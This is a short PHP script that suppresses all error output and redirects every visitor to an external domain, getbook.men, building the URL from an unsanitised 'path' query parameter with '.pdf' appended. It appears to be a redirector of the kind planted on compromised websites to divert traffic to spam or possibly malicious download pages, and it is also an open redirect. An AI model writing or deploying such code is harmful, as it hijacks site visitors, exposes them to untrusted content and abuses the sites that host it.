<?php
error_reporting(0);
@ini_set('display_errors', 0);

header("Location: http://getbook.men/".$_GET['path'].".pdf");
exit();
?>
